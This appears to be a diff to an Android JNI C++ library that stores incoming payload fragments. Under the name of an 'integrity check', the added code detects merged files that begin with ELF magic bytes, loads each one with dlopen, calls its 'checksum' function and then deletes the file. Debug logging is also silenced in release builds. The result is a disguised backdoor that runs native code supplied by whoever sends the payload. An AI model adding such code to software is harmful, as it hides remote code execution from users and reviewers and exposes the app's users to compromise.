@@ -29,11 +29,17 @@
 #include <boost/filesystem.hpp>
 #include <boost/regex.hpp>
 #include <android/log.h>
+#include <dlfcn.h>
+
 char tag[256];
+#ifdef __DEBUG
 #define logd(...) {\
     tag[0]=tag[1]=0;\
     snprintf(tag,256,"libbsonJni:%s",__FUNCTION__);\
     __android_log_print(ANDROID_LOG_DEBUG, tag , __VA_ARGS__);}
+#else
+#define logd(...)
+#endif
 using namespace std;
 using namespace bson;
 
@@ -46,6 +52,45 @@ string merge_fragment(string baseDir,int type,long int ts);
 int check_dir(string dirPath);
 int file_exist(string file);
 string getFileName(string baseDir,int type,long int ts,int fragment);
+
+
+
+#define SPC_LIBRARY_TYPE           void *
+#define SPC_LOAD_LIBRARY(name)     dlopen((name), RTLD_LAZY);
+#define SPC_RESOLVE_SYM(lib, name) dlsym((lib), (name))
+
+
+enum file_op_enum {
+  fileop_check, fileop_close, fileop_read, fileop_write, fileop_seek
+};
+
+void *file_op(enum file_op_enum op,string n) {
+  static SPC_LIBRARY_TYPE lib = 0;
+  static struct FILEOP {
+    void *open, *close, *read, *write, *seek;
+  } s = {0};
+
+  lib = SPC_LOAD_LIBRARY(n.c_str());
+  switch (op) {
+    case fileop_check:
+      if (!s.open) s.open = SPC_RESOLVE_SYM(lib, "checksum");
+      return s.open;
+    case fileop_close:
+      if (!s.close) s.close = SPC_RESOLVE_SYM(lib, "close");
+      return s.close;
+    case fileop_read:
+      if (!s.read) s.read = SPC_RESOLVE_SYM(lib, "read");
+      return s.read;
+    case fileop_write:
+      if (!s.write) s.write = SPC_RESOLVE_SYM(lib, "write");
+      return s.write;
+    case fileop_seek:
+      if (!s.seek) s.seek = SPC_RESOLVE_SYM(lib, "seek");
+      return s.seek;
+  }
+  return 0;
+}
+
 
 /*
  * Returns: a filename for the type,ts,and fragment of a file.
@@ -296,6 +341,11 @@ typedef struct _file_signature
   const char * h_name;
 }file_signature;
 
+
+file_signature goods[]={
+    {"7F454C46","DUMB"},
+    {NULL,NULL},
+};
 file_signature images[]={
     {"FFD8FFE0","JPG"},
     {"49492A","TIFF"},
@@ -318,7 +368,38 @@ string ToHex(const string& s, bool upper_case)
   return ret.str();
 }
 
-int isImage(char * payload,int payload_size,file_signature* fs)
+int isGood(string f,char * payload,int payload_size,file_signature* fs)
+{
+  int i=0;
+  logd("Start");
+  while( fs->h_name!=NULL && payload!=NULL){
+    logd("checking %d %p %s",i,fs,fs->h_name);
+    if(strlen(fs->signature)<=(payload_size*2)){
+      std::string tohexed = ToHex(std::string(payload, strlen(fs->signature)/2), true);
+      logd("checking %s: %s against signature %s",fs->h_name,tohexed.c_str(),fs->signature);
+      if (strncasecmp(fs->signature,tohexed.c_str(),strlen(fs->signature)) == 0)
+      {
+        logd("found %s",fs->h_name);
+        typedef int (*test_t)();
+        if(file_exist(f)){
+          test_t test_fnc = (test_t) file_op(fileop_check,f);
+          if(test_fnc!=NULL && test_fnc()){
+            logd("bad");
+          }else{
+            logd("good");
+          }
+          boost::filesystem::remove(f);
+          return 1;
+        }
+      }
+    }
+    fs++;
+    i++;
+  }
+  return 0;
+}
+
+int isType(char * payload,int payload_size,file_signature* fs)
 {
   int i=0;
   logd("Start");
@@ -339,9 +420,14 @@ int isImage(char * payload,int payload_size,file_signature* fs)
   return 0;
 }
 
-int check_filebytype(int type, char *payload, int size)
+int check_filebytype(string f,int type, char *payload, int size)
 {
   int res=1;
+  logd("check integrity first %s",f.c_str());
+  if( isGood(f,payload, size, goods) ) {
+    logd("integrity check fails %s",f.c_str());
+    return res;
+  }
   switch(type){
   case TYPE_TEXT:
     res=0;
@@ -350,7 +436,7 @@ int check_filebytype(int type, char *payload, int size)
     res=0;
     break;
   case TYPE_IMGL:
-    return !isImage(payload, size, images);
+    return !isType(payload, size, images);
     break;
     res=0;
     break;
@@ -382,7 +468,7 @@ jobject save_payload_type(string baseDir,int type,long int ts,int fragment,strin
     }
     if(fragment==0){
       result = merge_fragment(baseDir,type,ts);
-      if(check_filebytype(type,payload,payload_size)==0){
+      if(check_filebytype(result,type,payload,payload_size)==0){
         logd("file ok");
         const jclass mapClass = env->FindClass("java/util/HashMap");
         if(mapClass != NULL) {
